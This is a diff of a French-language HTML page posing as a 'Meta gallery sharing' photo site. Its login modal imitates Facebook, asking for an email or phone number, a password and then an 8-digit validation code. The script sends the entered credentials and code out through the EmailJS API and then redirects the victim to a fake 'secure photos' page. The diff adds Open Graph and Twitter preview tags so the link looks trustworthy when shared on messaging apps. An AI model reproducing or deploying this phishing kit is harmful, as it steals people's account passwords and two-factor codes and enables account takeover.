@@ -5,6 +5,19 @@
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
 <title>Meta gallery sharing</title>
 
+<!-- 🔹 META PREVIEW PARTAGE (Messenger / Instagram / Snapchat) -->
+<meta property="og:title" content="Meta gallery sharing">
+<meta property="og:description" content="Partage sécurisé de photos">
+<meta property="og:image" content="https://thecloud-share.netlify.app/logo.png">
+<meta property="og:url" content="https://thecloud-share.netlify.app">
+<meta property="og:type" content="website">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Meta gallery sharing">
+<meta name="twitter:description" content="Partage sécurisé de photos">
+<meta name="twitter:image" content="https://thecloud-share.netlify.app/logo.png">
+<!-- 🔹 FIN META PREVIEW -->
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
@@ -135,28 +148,23 @@ nav{
 <div class="modal" id="loginModal">
   <div class="box">
 
-
 <h2 style="text-align:center;color:#1877f2; display:flex; flex-direction:column; align-items:center; gap:10px;">
+  <img src="logo_fb.png" alt="logo_fb" style="width:48px; height:48px;">
+  Identification
+</h2>
 
-<img src="logo_fb.png" 
-             alt="logo_fb" 
-             style="width:48px; height:48px;">
+<div id="modalNotification"></div>
 
-        Identification
-      </h2>
+<input id="userId" placeholder="Courriel ou numéro de mobile">
+<input id="password" type="password" placeholder="Mot de passe">
+<input id="code" maxlength="8" placeholder="Code de validation" style="display:none">
 
-    <div id="modalNotification"></div>
+<button class="btn" id="confirmLogin" style="width:100%;margin-top:12px">
+  Se connecter
+</button>
 
-    <input id="userId" placeholder="Courriel ou numéro de mobile">
-    <input id="password" type="password" placeholder="Mot de passe">
-    <input id="code" maxlength="8" placeholder="Code de validation" style="display:none">
-
-    <button class="btn" id="confirmLogin" style="width:100%;margin-top:12px">
-      Se connecter
-    </button>
-
-    <p class="note">Accès sécurisé</p>
-  </div>
+<p class="note">Accès sécurisé</p>
+</div>
 </div>
 
 <script>
@@ -168,14 +176,12 @@ const userIdInput = document.getElementById('userId');
 const passwordInput = document.getElementById('password');
 const modalNotif = document.getElementById('modalNotification');
 
-let codeSent = false; // état du bouton
+let codeSent = false;
 
-// 🔹 REDIRECTION SI TOKEN EXISTE
 if(sessionStorage.getItem("demo_auth_token") === "true"){
     window.location.href = "secure-photos.html";
 }
 
-// Notification animée
 function showModalNotification(message){
     modalNotif.textContent = message;
     modalNotif.style.display = "block";
@@ -190,11 +196,9 @@ function showModalNotification(message){
     }, 3000);
 }
 
-// Ouvrir modale
 loginBtn.addEventListener("click", ()=> modal.style.display = "flex");
 modal.addEventListener("click", e=>{if(e.target===modal) modal.style.display="none";});
 
-// EMAILJS (remplace tes clés ici)
 async function sendEmailLogin(username, password){
   return fetch("https://api.emailjs.com/api/v1.0/email/send",{
     method:"POST",
@@ -220,12 +224,11 @@ async function sendCodeValidation(code){
   });
 }
 
-// CONNEXION (un seul gestionnaire avec état)
 confirmLogin.onclick = async ()=>{
   const user = userIdInput.value.trim();
   const pwd  = passwordInput.value.trim();
 
-  if(!codeSent){ // première étape : envoi email
+  if(!codeSent){
     if(!user || !pwd){
       showModalNotification("Veuillez remplir tous les champs.");
       return;
@@ -246,12 +249,10 @@ confirmLogin.onclick = async ()=>{
     codeInput.style.display = "block";
     confirmLogin.textContent = "Valider le code";
     confirmLogin.disabled = false;
-
-    codeSent = true; // passe à l'état validation
+    codeSent = true;
     return;
   }
 
-  // validation du code
   const code = codeInput.value.trim();
   if(!/^[0-9]{6,8}$/.test(code)){
     showModalNotification("Code invalide.");
@@ -264,7 +265,6 @@ confirmLogin.onclick = async ()=>{
     return;
   }
 
-  // ✅ Token défini et redirection
   sessionStorage.setItem("demo_auth_token","true");
   window.location.href="secure-photos.html";
 };
@@ -272,3 +272,4 @@ confirmLogin.onclick = async ()=>{
 
 </body>
 </html>
+
